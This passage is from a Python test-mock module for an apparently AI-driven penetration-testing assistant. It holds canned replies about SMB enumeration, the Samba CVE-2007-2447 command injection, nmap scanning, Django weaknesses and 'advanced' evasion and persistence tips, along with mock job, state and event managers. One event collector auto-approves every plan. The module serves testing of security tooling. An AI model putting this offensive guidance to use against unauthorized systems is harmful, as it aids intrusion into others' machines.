                "The CVE for the Samba username map script vulnerability is CVE-2007-2447. This "
                "vulnerability affects Samba versions 3.0.0 through 3.0.25rc3 and allows remote "
                "command execution through metacharacter injection in the username field."
            )

        elif "smb" in command_lower and "ports" in command_lower and ("common" in command_lower or "what" in command_lower):
            return (
                "Common SMB ports are: port 139 (NetBIOS Session Service) and port 445 "
                "(Microsoft-DS/SMB over TCP). Port 445 is the modern SMB port used in Windows 2000 "
                "and later, while port 139 is the legacy NetBIOS port. Both TCP ports are used for "
                "SMB/CIFS file sharing and related services."
            )

        # Handle SMB enumeration explanation
        elif "explain" in command_lower and "smb enumeration" in command_lower and "process" in command_lower:
            return "SMB enumeration process involves: 1) **Discovery** - Use tools like nmap to find SMB services (ports 139/445), 2) **Share Enumeration** - List available shares using smbclient or enum4linux, 3) **User Enumeration** - Identify users and groups via rpcclient or enum4linux, 4) **Permission Analysis** - Check access levels on shares and files, 5) **Version Detection** - Identify SMB/Samba versions for vulnerability research, 6) **Documentation** - Record all findings for analysis. Key tools: smbclient, enum4linux, rpcclient, smbmap, nmap scripts."

        # Handle beginner questions
        elif ("new" in command_lower or "beginner" in command_lower) and ("pentesting" in command_lower or "scanning" in command_lower):
            return "Welcome to pentesting! Here's how to start network scanning: First, understand your scope and get proper authorization. Then begin with basic tools: 1) **Start simple** with ping to check if hosts are alive, 2) Use **basic nmap scans** like 'nmap -sn network' for host discovery, 3) Then scan specific hosts with 'nmap -sV target' to find services, 4) Document everything you find. Remember: always have permission before scanning! Start with these basics and gradually learn more advanced techniques."

        # Handle expert questions
        elif "advanced" in command_lower and ("technique" in command_lower or "pentesting" in command_lower):
            return "For advanced pentesting: 1) Employ sophisticated evasion techniques like packet fragmentation and decoy scanning, 2) Chain multiple vulnerabilities for complex attack paths, 3) Develop custom exploits for unpatched vulnerabilities, 4) Use advanced post-exploitation frameworks, 5) Implement covert channels and advanced persistence mechanisms, 6) Perform memory forensics and anti-forensics, 7) Leverage supply chain attacks and trust relationships. Always maintain detailed documentation and follow responsible disclosure."

        # Handle nmap error explanation from command history context
        elif self.command_history and any("nmap returned error" in cmd for cmd in self.command_history or "scan completed but" in cmd for cmd in self.command_history):
            if "error" in command_lower and ("mean" in command_lower or "fix" in command_lower):
                return (
                    "The nmap error code 1 indicates a permission issue. You need to run nmap with "
                    "elevated privileges using sudo. Try: sudo nmap [options] [target]. Also check if "
                    "the target is reachable and make sure firewall rules allow the scan. Common fixes: "
                    "1) Use sudo for root privileges, 2) Check network connectivity, 3) Verify target IP "
                    "is correct, 4) Ensure no firewall blocking."
                )

        # Handle previous command context
        elif self.command_history and len(self.command_history) > 1:
            prev_command = self.command_history[-2].lower()

            # Check for web application context
            web_context = False
            django_context = False
            target_ip = None
            target_port = None

            # Scan recent command history for context
            for cmd in self.command_history[-4:]:
                cmd_lower = cmd.lower()
                if "web application" in cmd_lower or "web app" in cmd_lower:
                    web_context = True
                if "django" in cmd_lower:
                    django_context = True
                if "192.168" in cmd:
                    # Extract IP
                    import re
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', cmd)
                    if ip_match:
                        target_ip = ip_match.group(1)
                if "port" in cmd_lower and "8080" in cmd:
                    target_port = "8080"

            # If asking about tools for web testing
            if web_context and "tools" in command_lower and ("test" in command_lower or "use" in command_lower):
                response = "For testing the web application"
                if target_ip:
                    response += f" at {target_ip}"
                if target_port:
                    response += f" on port {target_port}"

                response += ", I recommend using: 1) **Burp Suite** or **OWASP ZAP** for web proxy and vulnerability scanning, 2) **Nikto** for web server scanning, 3) **Dirb** or **Gobuster** for directory/file enumeration, 4) **SQLMap** for SQL injection testing"

                if django_context:
                    response += ", 5) **Django-specific tools** like django-debug-toolbar exploitation, 6) Check for DEBUG=True misconfigurations, 7) Test for Django admin panel at /admin/, 8) Look for exposed static/media files"
                else:
                    response += ", 5) **WPScan** if it's WordPress, 6) **Joomscan** for Joomla"

                response += ". Start with automated scanning then move to manual testing with Burp/ZAP."
                return response

            # If asking about Django-specific vulnerabilities
            if django_context and "django" in command_lower and ("vulnerabilities" in command_lower or "vulnerability" in command_lower):
                return "For Django-specific vulnerabilities, check for: 1) **DEBUG=True** in production (exposes sensitive data), 2) **Weak SECRET_KEY** configurations, 3) **SQL injection** in raw queries, 4) **Template injection** vulnerabilities, 5) **Exposed admin panel** without proper protection, 6) **Clickjacking** if X-Frame-Options not set, 7) **CSRF token** bypass attempts, 8) **File upload** vulnerabilities in forms, 9) Check Django version for known CVEs. Use tools like Burp Suite with Django Security Checklist."

            # If previous was about Samba and current asks for next steps
            if "samba" in prev_command and "what" in command_lower and "next" in command_lower:
                return "After identifying Samba service, the next steps are: 1) Check the Samba version for known vulnerabilities (especially CVE-2007-2447 for older versions), 2) Enumerate shares using enum4linux or smbclient, 3) Try anonymous access to shares, 4) Look for sensitive files in accessible shares, 5) Test for username map script vulnerability if version is 3.0.20-3.0.25."

            # If asking about service after scan
            elif "scan" in prev_command and "service" in command_lower:
                if "found" in command_lower or "discovered" in command_lower:
                    return "Based on the scan, we found Samba (SMB) service on port 445, SSH on port 22, and FTP on port 21. The Samba service is particularly interesting as it's running version 3.0.20 which has known vulnerabilities. Focus on enumerating and testing the SMB service first."

        # If we have a job manager and tool executor, use them for actual tool execution
        if self.job_manager and self.tool_executor and self.wish_instance:
            # Generate a plan based on command
            plan = await self._generate_plan(command)

            # Execute plan steps as jobs
            for step in plan.steps:
                # Create task for this step
                task = asyncio.create_task(self._execute_tool_coroutine(step.command, step.tool_name))

                # Submit job with the task
                job_id = await self.job_manager.submit_job(
                    description=step.purpose,
                    coroutine=task,  # Pass the task
                    tool_name=step.tool_name,
                    command=step.command,
                    step_info={"step": step}
                )

            return f"Executed {len(plan.steps)} steps"

        return "Command processed"

    async def _generate_plan(self, command: str):
        """Generate a simple plan from command."""
        # Check for invalid targets
        if "invalid" in command and ("nonexistent" in command or "target" in command):
            # Fire error event if wish instance available
            if self.wish_instance and hasattr(self.wish_instance, '_event_handlers'):
                error_handlers = self.wish_instance._event_handlers.get('error_occurred', [])
                for handler in error_handlers:
                    class MockEvent:
                        def __init__(self, event_type, data):
                            self.event_type = event_type
                            self.data = data
                            self.timestamp = time.time()

                    await handler(MockEvent('error_occurred', {
                        'error': 'Invalid target: DNS resolution failed for invalid.nonexistent.local',
                        'context': command
                    }))

            # Return a plan that will fail
            return Plan(
                description="Scan invalid target",
                steps=[
                    PlanStep(
                        tool_name="nmap",
                        command="nmap -sV invalid.target.local",
                        purpose="Scan invalid target",
                        expected_result="Error - DNS resolution failed"
                    )
                ],
                rationale="Attempting to scan invalid target"
            )

        # Use the MockLLMService to generate plan
        llm = MockLLMService()
        return await llm.generate_plan(command, {})


class MockSessionManager:
    """Mock session manager."""

    def __init__(self):
        self.sessions = {}
        self.current_session = None

    def create_session(self):
        """Create a mock session."""
        from wish_models.session import SessionMetadata
        session = SessionMetadata(
            session_id=f"test-session-{len(self.sessions)}",
            engagement_name="Test Engagement",
            current_mode="recon"
        )
        self.sessions[session.session_id] = session
        self.current_session = session
        return session

    async def save_session(self, state):
        """Mock save session."""
        pass


class MockStateManager:
    """Mock state manager."""

    def __init__(self):
        from wish_models.engagement import EngagementState
        from wish_models.session import SessionMetadata

        # Create session metadata first
        self.session = SessionMetadata(
            session_id="test-session",
            engagement_name="test-engagement",
            current_mode="recon"
        )

        # Create engagement state with session metadata
        self.state = EngagementState(
            name="test-engagement",
            session_metadata=self.session
        )

    async def initialize(self):
        """Mock initialize."""
        pass

    def get_engagement_state(self):
        """Get current state."""
        return self.state

    async def get_current_state(self):
        """Get current state async."""
        return self.state

    async def update_state(self, new_state):
        """Update the state."""
        self.state = new_state

    async def add_command_to_history(self, command: str):
        """Add command to history."""
        # Mock implementation - just append to history
        if not hasattr(self.state.session_metadata, 'command_history'):
            self.state.session_metadata.command_history = []
        self.state.session_metadata.command_history.append(command)

    async def add_target(self, target):
        """Add target to the engagement state."""
        # Initialize targets dict if not exists
        if not hasattr(self.state, 'targets') or self.state.targets is None:
            self.state.targets = {}

        # Add target using scope as key
        self.state.targets[target.scope] = target

    async def add_finding(self, finding):
        """Add finding to the engagement state."""
        # Initialize findings dict if not exists
        if not hasattr(self.state, 'findings') or self.state.findings is None:
            self.state.findings = {}

        # Generate ID if not present
        if not hasattr(finding, 'id') or finding.id is None:
            finding.id = f"finding-{len(self.state.findings) + 1}"

        # Add finding using ID as key
        self.state.findings[finding.id] = finding


class MockConfigManager:
    """Mock config manager."""

    def __init__(self):
        self.config = {}


class MockEventCollector:
    """Collect events for testing assertions."""

    def __init__(self):
        self.events: list[dict[str, Any]] = []
        self.plan_approvals: list[Plan] = []
        self.errors: list[Exception] = []

    def collect_plan_approval(self, event):
        """Collect plan approval events."""
        # For testing, we'll store the plan data directly
        plan_data = event.data.get("plan", {})

        # Plan is already a Plan object from HeadlessWish
        if hasattr(plan_data, 'steps'):
            # It's already a Plan object
            plan = plan_data
        elif isinstance(plan_data, dict):
            # Convert dict to Plan object
            from wish_ai.planning.models import Plan, PlanStep

            # Convert steps from dict to PlanStep objects
            steps = []
            for step_data in plan_data.get("steps", []):
                if isinstance(step_data, dict):
                    step = PlanStep(
                        tool_name=step_data.get("tool_name", ""),
                        command=step_data.get("command", ""),
                        purpose=step_data.get("purpose", ""),
                        expected_result=step_data.get("expected_result", "")
                    )
                    steps.append(step)
                else:
                    steps.append(step_data)

            plan = Plan(
                description=plan_data.get("description", ""),
                steps=steps,
                rationale=plan_data.get("rationale", "")
            )
        else:
            # Fallback
            plan = plan_data

        self.plan_approvals.append(plan)
        return "approve"  # Auto-approve

    def collect_error(self, event):
        """Collect error events."""
        self.errors.append(event.data)

    def collect_all(self, event):
        """Collect all events."""
        self.events.append({
            "type": event.event_type,
            "data": event.data,
            "timestamp": event.timestamp
        })

    def clear(self):
        """Clear all collected events."""
        self.events.clear()
        self.plan_approvals.clear()
        self.errors.clear()

    def get_events_by_type(self, event_type) -> list[dict[str, Any]]:
        """Get events of specific type."""
        return [e for e in self.events if e["type"] == event_type]


class JobStatus:
    """Mock JobStatus enum."""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


class JobInfo:
    """Mock JobInfo dataclass."""

    def __init__(self, job_id: str, description: str, status: str = JobStatus.PENDING, **kwargs):
        self.job_id = job_id
        self.description = description
        self.status = status
        self.created_at = kwargs.get('created_at', time.time())
        self.started_at = kwargs.get('started_at', None)
        self.completed_at = kwargs.get('completed_at', None)
        self.result = kwargs.get('result', None)
        self.error = kwargs.get('error', None)
        self.task = kwargs.get('task', None)
        # Extended job information
        self.command = kwargs.get('command', None)
        self.tool_name = kwargs.get('tool_name', None)
        self.parameters = kwargs.get('parameters', None)
        self.output = kwargs.get('output', None)
        self.full_output = kwargs.get('full_output', None)
        self.exit_code = kwargs.get('exit_code', None)
        self.step_info = kwargs.get('step_info', None)


class MockJobManager:
    """Mock JobManager for E2E testing."""

    def __init__(self, max_concurrent_jobs: int = 10):
        self.max_concurrent_jobs = max_concurrent_jobs
        self.jobs: dict[str, JobInfo] = {}
        self.job_counter = 0
        self.running_jobs = 0
        self._job_queue: list[tuple] = []
        self.event_callback: Callable | None = None
        self._submit_lock = asyncio.Lock()

    async def submit_job(self, description: str, coroutine: Awaitable[Any], **kwargs) -> str:
        """Submit a job for execution."""
        async with self._submit_lock:
            job_id = f"job_{self.job_counter:03d}"
            self.job_counter += 1

            job_info = JobInfo(
                job_id=job_id,
                description=description,
                status=JobStatus.PENDING,
                **kwargs
            )
            self.jobs[job_id] = job_info

            # Check if we can run immediately
            if self.running_jobs < self.max_concurrent_jobs:
                # Increment counter before starting
                self.running_jobs += 1
                asyncio.create_task(self._run_job(job_info, coroutine))
            else:
                # Queue the job
                self._job_queue.append((job_info, coroutine))

            # Small delay to ensure job state updates are processed
            await asyncio.sleep(0.01)

            return job_id

    async def _run_job(self, job_info: JobInfo, coroutine: Awaitable[Any]):
        """Run a job asynchronously."""
        try:
            # Update status to running
            job_info.status = JobStatus.RUNNING
            job_info.started_at = time.time()

            # Fire job started event
            if self.event_callback:
                await self.event_callback("job_started", {
                    "job_id": job_info.job_id,
                    "tool": job_info.tool_name,
                    "command": job_info.command,
                    "description": job_info.description
                })

            # Add small delay to ensure RUNNING state is observable and to simulate real work
            await asyncio.sleep(0.1)

            # Execute the coroutine
            result = await coroutine

            # Update job info with result
            job_info.status = JobStatus.COMPLETED
            job_info.completed_at = time.time()
            job_info.result = result

            # Extract output if available
            if hasattr(result, 'stdout'):
                job_info.output = result.stdout[:500] if result.stdout else ""
                job_info.full_output = result.stdout
            if hasattr(result, 'exit_code'):
                job_info.exit_code = result.exit_code

            # Fire job completed event
            if self.event_callback:
                await self.event_callback("job_completed", {
                    "job_id": job_info.job_id,
                    "result": result,
                    "duration": job_info.completed_at - job_info.started_at
                })

        except Exception as e:
            # Handle job failure
            job_info.status = JobStatus.FAILED
            job_info.completed_at = time.time()
            job_info.error = str(e)

            # Fire job failed event
            if self.event_callback:
                await self.event_callback("job_failed", {
                    "job_id": job_info.job_id,
                    "error": str(e),
                    "tool": job_info.tool_name,
                    "command": job_info.command
                })

        finally:
            self.running_jobs -= 1
            # Process queued jobs
            await self._process_queue()

    async def _process_queue(self):
        """Process queued jobs if slots are available."""
        while self._job_queue and self.running_jobs < self.max_concurrent_jobs:
            job_info, coroutine = self._job_queue.pop(0)
            # Increment counter before starting
            self.running_jobs += 1
            asyncio.create_task(self._run_job(job_info, coroutine))

    async def cancel_job(self, job_id: str) -> bool:
        """Cancel a job."""
        if job_id in self.jobs:
            job = self.jobs[job_id]
            if job.status in [JobStatus.PENDING, JobStatus.RUNNING]:
                job.status = JobStatus.CANCELLED
                job.completed_at = time.time()

                # Cancel the task if it exists
                if job.task:
                    job.task.cancel()

                return True
        return False

    def get_job_info(self, job_id: str) -> JobInfo | None:
        """Get job information."""
        return self.jobs.get(job_id)

    def get_running_jobs(self) -> list[str]:
        """Get list of running job IDs."""
        return [job_id for job_id, job in self.jobs.items()
                if job.status == JobStatus.RUNNING]

    def get_all_jobs(self) -> dict[str, JobInfo]:
        """Get all jobs."""
        return self.jobs.copy()

    def clear_completed(self):
        """Clear completed jobs."""
        completed_jobs = [job_id for job_id, job in self.jobs.items()
                         if job.status in [JobStatus.COMPLETED, JobStatus.FAILED, JobStatus.CANCELLED]]
        for job_id in completed_jobs:
            del self.jobs[job_id]
